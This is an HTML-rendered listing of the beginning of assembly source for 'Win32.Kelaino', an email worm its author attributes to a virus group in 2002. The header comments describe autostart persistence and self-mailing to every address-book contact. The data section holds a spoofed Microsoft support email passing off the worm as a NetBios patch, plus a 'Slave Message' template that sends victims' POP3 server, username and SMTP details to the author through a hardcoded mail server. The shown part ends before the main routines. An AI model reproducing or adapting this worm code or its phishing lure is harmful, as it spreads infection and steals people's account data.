<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>kelaino.asm</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
.sc13 {
	color: #808080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">; Name:       Win32.Kelaino</span><span class="sc0">
</span><span class="sc1">; Coder:      BeLiAL/bcvg</span><span class="sc0">
</span><span class="sc1">; Type:       Worm</span><span class="sc0">

</span><span class="sc1">; Because of the fact that good old file infectors are nearly dead</span><span class="sc0">
</span><span class="sc1">; i coded this little worm. Its my newest generation of virii, because</span><span class="sc0">
</span><span class="sc1">; i never coded such a worm before. ;)</span><span class="sc0">
</span><span class="sc1">; It searches from the registry some data like smtp server, WAB, etc...</span><span class="sc0">
</span><span class="sc1">; After this procedure the worm copies itself to the windows directory and</span><span class="sc0">
</span><span class="sc1">; write itself in the registry in the 'Run' folder (autostart!). When this</span><span class="sc0">
</span><span class="sc1">; is done, it displays after a firsttime installation a message box for the victim.</span><span class="sc0">
</span><span class="sc1">; Now it waits since the computer gets an inet connection. After the connection</span><span class="sc0">
</span><span class="sc1">; is established it sends itself to all people in the WAB. The worm uses a</span><span class="sc0">
</span><span class="sc1">; SMTP engine, not the MAPI stuff from windows. The mail it sends is a</span><span class="sc0">
</span><span class="sc1">; spoofed message from microsoft which contains the worm (looking like a patch).</span><span class="sc0">
</span><span class="sc1">; As payload it sends to me some personal data like pop3 server and username</span><span class="sc0">
</span><span class="sc1">; via mail too.</span><span class="sc0">
</span><span class="sc1">; of the poor victim. When there is no smtp server in the registry, the worm </span><span class="sc0">
</span><span class="sc1">; uses an hardcoded server.</span><span class="sc0">
</span><span class="sc1">; The data segment has to be ebcrypted with a simple 8-Bit encryption from </span><span class="sc0">
</span><span class="sc1">; dataenc.asm (some lame kiddies spy files with hexedit and feel elite).</span><span class="sc0">
</span><span class="sc1">; Im quite happy with this worm but bedder and newer generations of worms</span><span class="sc0">
</span><span class="sc1">; will follow! My scanners looked all together for PE-Infection Virii (especially for</span><span class="sc0">
</span><span class="sc1">; the procedure which searches for APIs in the kernel), so they didnt find my</span><span class="sc0">
</span><span class="sc1">; Win32.Kelaino. HuarHuar!!!!</span><span class="sc0">

</span><span class="sc1">; Credits:</span><span class="sc0">

</span><span class="sc1">; - Thanx to BumbleBee for his Base64 encrypter and tuts</span><span class="sc0">
</span><span class="sc1">; - Greetings to the whole BlackCat Group especially to Danny T and SatanicCoder</span><span class="sc0">
</span><span class="sc1">; - I also want to say hello to my friend PhileToaster, hope well meet each other</span><span class="sc0">
</span><span class="sc1">;   someday ;) </span><span class="sc0">
</span><span class="sc1">; - Special greets fly out to Cwarrior, malfunction, nekronomicon and the whole</span><span class="sc0">
</span><span class="sc1">;   #german_vir channel</span><span class="sc0">
</span><span class="sc1">; - And last but not least greetings to Mandragore, Virusbust and Toro</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; BeLiAL, early 2002 / Black Cat Virus Group </span><span class="sc0">


</span><span class="sc2">.386</span><span class="sc0">
</span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">flat</span><span class="sc0">

</span><span class="sc9">EXTRN</span><span class="sc0"> </span><span class="sc5">ExitProcess</span><span class="sc4">:</span><span class="sc9">Proc</span><span class="sc0">
</span><span class="sc9">EXTRN</span><span class="sc0"> </span><span class="sc5">WSAStartup</span><span class="sc4">:</span><span class="sc9">Proc</span><span class="sc0">
</span><span class="sc9">EXTRN</span><span class="sc0"> </span><span class="sc5">socket</span><span class="sc4">:</span><span class="sc9">Proc</span><span class="sc0">
</span><span class="sc9">EXTRN</span><span class="sc0"> </span><span class="sc5">WSACleanup</span><span class="sc4">:</span><span class="sc9">Proc</span><span class="sc0">
</span><span class="sc9">EXTRN</span><span class="sc0"> </span><span class="sc5">closesocket</span><span class="sc4">:</span><span class="sc9">Proc</span><span class="sc0">
</span><span class="sc9">EXTRN</span><span class="sc0"> </span><span class="sc5">gethostbyname</span><span class="sc4">:</span><span class="sc9">Proc</span><span class="sc0">
</span><span class="sc9">EXTRN</span><span class="sc0"> </span><span class="sc5">send</span><span class="sc4">:</span><span class="sc9">Proc</span><span class="sc0">
</span><span class="sc9">EXTRN</span><span class="sc0"> </span><span class="sc5">recv</span><span class="sc4">:</span><span class="sc9">Proc</span><span class="sc0">
</span><span class="sc9">EXTRN</span><span class="sc0"> </span><span class="sc5">htons</span><span class="sc4">:</span><span class="sc9">Proc</span><span class="sc0">
</span><span class="sc9">EXTRN</span><span class="sc0"> </span><span class="sc5">connect</span><span class="sc4">:</span><span class="sc9">Proc</span><span class="sc0">
</span><span class="sc9">EXTRN</span><span class="sc0"> </span><span class="sc5">CreateFileA</span><span class="sc4">:</span><span class="sc9">Proc</span><span class="sc0">
</span><span class="sc9">EXTRN</span><span class="sc0"> </span><span class="sc5">CreateFileMappingA</span><span class="sc4">:</span><span class="sc9">Proc</span><span class="sc0">
</span><span class="sc9">EXTRN</span><span class="sc0"> </span><span class="sc5">MapViewOfFile</span><span class="sc4">:</span><span class="sc9">Proc</span><span class="sc0">
</span><span class="sc9">EXTRN</span><span class="sc0"> </span><span class="sc5">CloseHandle</span><span class="sc4">:</span><span class="sc9">Proc</span><span class="sc0">
</span><span class="sc9">EXTRN</span><span class="sc0"> </span><span class="sc5">UnmapViewOfFile</span><span class="sc4">:</span><span class="sc9">Proc</span><span class="sc0">
</span><span class="sc9">EXTRN</span><span class="sc0"> </span><span class="sc5">GlobalAlloc</span><span class="sc4">:</span><span class="sc9">Proc</span><span class="sc0">
</span><span class="sc9">EXTRN</span><span class="sc0"> </span><span class="sc5">GlobalFree</span><span class="sc4">:</span><span class="sc9">Proc</span><span class="sc0">
</span><span class="sc9">EXTRN</span><span class="sc0"> </span><span class="sc5">RegOpenKeyExA</span><span class="sc4">:</span><span class="sc9">Proc</span><span class="sc0">
</span><span class="sc9">EXTRN</span><span class="sc0"> </span><span class="sc5">RegSetValueExA</span><span class="sc4">:</span><span class="sc9">Proc</span><span class="sc0">
</span><span class="sc9">EXTRN</span><span class="sc0"> </span><span class="sc5">RegQueryValueExA</span><span class="sc4">:</span><span class="sc9">Proc</span><span class="sc0">
</span><span class="sc9">EXTRN</span><span class="sc0"> </span><span class="sc5">RegCloseKey</span><span class="sc4">:</span><span class="sc9">Proc</span><span class="sc0">
</span><span class="sc9">EXTRN</span><span class="sc0"> </span><span class="sc5">GetModuleFileNameA</span><span class="sc4">:</span><span class="sc9">Proc</span><span class="sc0">
</span><span class="sc9">EXTRN</span><span class="sc0"> </span><span class="sc5">GetProcAddress</span><span class="sc4">:</span><span class="sc9">Proc</span><span class="sc0">
</span><span class="sc9">EXTRN</span><span class="sc0"> </span><span class="sc5">LoadLibraryA</span><span class="sc4">:</span><span class="sc9">Proc</span><span class="sc0">
</span><span class="sc9">EXTRN</span><span class="sc0"> </span><span class="sc5">FreeLibrary</span><span class="sc4">:</span><span class="sc9">Proc</span><span class="sc0">
</span><span class="sc9">EXTRN</span><span class="sc0"> </span><span class="sc5">CopyFileA</span><span class="sc4">:</span><span class="sc9">Proc</span><span class="sc0">
</span><span class="sc9">EXTRN</span><span class="sc0"> </span><span class="sc5">GetWindowsDirectoryA</span><span class="sc4">:</span><span class="sc9">Proc</span><span class="sc0">
</span><span class="sc9">EXTRN</span><span class="sc0"> </span><span class="sc5">GetCurrentDirectoryA</span><span class="sc4">:</span><span class="sc9">Proc</span><span class="sc0">
</span><span class="sc9">EXTRN</span><span class="sc0"> </span><span class="sc5">SetCurrentDirectoryA</span><span class="sc4">:</span><span class="sc9">Proc</span><span class="sc0">
</span><span class="sc9">EXTRN</span><span class="sc0"> </span><span class="sc5">MessageBoxA</span><span class="sc4">:</span><span class="sc9">Proc</span><span class="sc0">
</span><span class="sc9">EXTRN</span><span class="sc0"> </span><span class="sc5">GetFileSize</span><span class="sc4">:</span><span class="sc9">Proc</span><span class="sc0">

</span><span class="sc1">;------------------------------------------------------data and equates--------------------------------</span><span class="sc0">

</span><span class="sc5">SOCK_STREAM</span><span class="sc0">         </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">AF_INET</span><span class="sc0">               </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">2</span><span class="sc0">
</span><span class="sc5">MAIL_TEXT_LENGHT</span><span class="sc0">      </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">mail_lenght_end</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">mail_lenght_start</span><span class="sc0">
</span><span class="sc5">MAIL_TEXT_LENGHT2</span><span class="sc0">     </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">mail_lenght_end2</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">mail_lenght_start2</span><span class="sc0">
</span><span class="sc5">HKEY_CURRENT_USER</span><span class="sc0">     </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">80000001h</span><span class="sc0">
</span><span class="sc5">HKEY_LOCAL_MACHINE</span><span class="sc0">    </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">80000002h</span><span class="sc0">
</span><span class="sc5">KEY_ALL_ACCESS</span><span class="sc0">        </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">001F0000h</span><span class="sc0">
</span><span class="sc5">PAGE_READONLY</span><span class="sc0">         </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">2</span><span class="sc0">
</span><span class="sc5">FILE_MAP_READ</span><span class="sc0">         </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">REG_SZ</span><span class="sc0">          </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">INFO_MAIL</span><span class="sc0">             </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">00000001h</span><span class="sc0">
</span><span class="sc5">FAKE_MAIL</span><span class="sc0">             </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">00000002h</span><span class="sc0">

</span><span class="sc9">.data</span><span class="sc0">

</span><span class="sc5">WSADATA</span><span class="sc0">     </span><span class="sc9">struct</span><span class="sc0">

    </span><span class="sc5">mVersion</span><span class="sc0">          </span><span class="sc9">dw</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">mHighVersion</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">szDescription</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">257</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc5">szSystemStatus</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">129</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc5">iMaxSockets</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">iMaxUpdDg</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">lpVendorInfo</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">WSADATA</span><span class="sc0">     </span><span class="sc9">ends</span><span class="sc0">

</span><span class="sc5">SOCKADDR_IN</span><span class="sc0">       </span><span class="sc9">struc</span><span class="sc0">

      </span><span class="sc5">sin_family</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc5">sin_port</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc5">sin_addr</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc5">sin_zero</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">SOCKADDR_IN</span><span class="sc0">       </span><span class="sc9">ends</span><span class="sc0">  

</span><span class="sc5">data_seg_start</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">wsadata</span><span class="sc0">             </span><span class="sc5">WSADATA</span><span class="sc0"> </span><span class="sc4">&lt;&gt;</span><span class="sc0">
</span><span class="sc5">sockaddr_in</span><span class="sc0">             </span><span class="sc5">SOCKADDR_IN</span><span class="sc0"> </span><span class="sc4">&lt;&gt;</span><span class="sc0">     

</span><span class="sc5">socket_descriptor</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">hardcode_server</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"www.festu.ru"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">smtpaddress_offset</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">smtp_ip</span><span class="sc0">                 </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">to_read_data</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">data_in_buffer</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">100</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">the_helo</span><span class="sc0">                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">14</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"helo support"</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
</span><span class="sc5">the_mailfrom</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">34</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"mail from: support@microsoft.com"</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">                        
</span><span class="sc5">the_rcptto</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">9</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"rcpt to: "</span><span class="sc0">
</span><span class="sc5">the_data</span><span class="sc0">                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"data"</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">                                                                          
</span><span class="sc5">the_helo2</span><span class="sc0">               </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">12</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"helo admin"</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
</span><span class="sc5">the_mailfrom2</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">27</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"mail from: admin@festu.ru"</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
                                                
</span><span class="sc5">the_datatest</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc5">MAIL_TEXT_LENGHT</span><span class="sc0">
</span><span class="sc5">mail_lenght_start</span><span class="sc4">:</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'From: "Microsoft Support" &lt;support@microsoft.com&gt;'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Subject: Support Message'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'MIME-Version: 1.0'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Content-Type: multipart/mixed;'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'        boundary="----=_NextPart_000_0005_01BDE2EC.8B286C00"'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'X-Priority: 3'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'X-MSMail-Priority: Normal'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'X-Unsent: 1'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'X-MimeOLE: Produced By Microsoft MimeOLE V4.72.3110.3'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">

                        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'------=_NextPart_000_0005_01BDE2EC.8B286C00'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Content-Type: text/plain; charset=iso-8859-1'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Content-Transfer-Encoding: quoted-printable'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">                
                        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
                        
                        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"During the last time, many bugs were found in our software. Because"</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"of our product philosophie, we want to give our custumers as much security"</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"as possible. So we decided to send out to all known Microsoft custumers the"</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"NetBios patch Version 1.0 . This patch will fix all the known and possibly unknown"</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"bugs and securityholes on port 137 and 139 ."</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"The patch is completly free and easy to install. Our patch will install"</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"itself after starting and run as background process. After a successfull"</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"installation you should get an OK message box."</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0"> 
                        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"Thanx for using Microsoft products."</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"Your Microsoft Support Team"</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
                        
                        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'------=_NextPart_000_0005_01BDE2EC.8B286C00'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Content-Type: application/octet-stream; name=netbiospatch10.exe'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Content-Transfer-Encoding: base64'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Content-Disposition: attachment; filename="netbiospatch10.exe"'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
</span><span class="sc5">mail_lenght_end</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">the_datatest2</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc5">MAIL_TEXT_LENGHT2</span><span class="sc0">
</span><span class="sc5">mail_lenght_start2</span><span class="sc4">:</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'From: "Kelaino" &lt;kelaino@microsoft.com&gt;'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Subject: Slave Message'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'MIME-Version: 1.0'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Content-Type: multipart/mixed;'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'        boundary="----=_NextPart_000_0005_01BDE2EC.8B286C00"'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'X-Priority: 3'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'X-MSMail-Priority: Normal'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'X-Unsent: 1'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'X-MimeOLE: Produced By Microsoft MimeOLE V4.72.3110.3'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">

                        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'------=_NextPart_000_0005_01BDE2EC.8B286C00'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Content-Type: text/plain; charset=iso-8859-1'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Content-Transfer-Encoding: quoted-printable'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">                
                        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">

</span><span class="sc5">user_pop3_server</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">30</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
</span><span class="sc5">user_pop3_name</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">30</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
</span><span class="sc5">user_smtp_address</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">30</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"Glad to serve u, master"</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">

</span><span class="sc5">mail_lenght_end2</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">fileend</span><span class="sc0">                 </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">9</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"--123--"</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">                        
</span><span class="sc5">the_dot</span><span class="sc0">                 </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"."</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
</span><span class="sc5">the_quit</span><span class="sc0">                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"quit"</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">                                                
</span><span class="sc5">filehandle</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">filemaphandle</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">mapaddress</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">freemem_offset</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> 

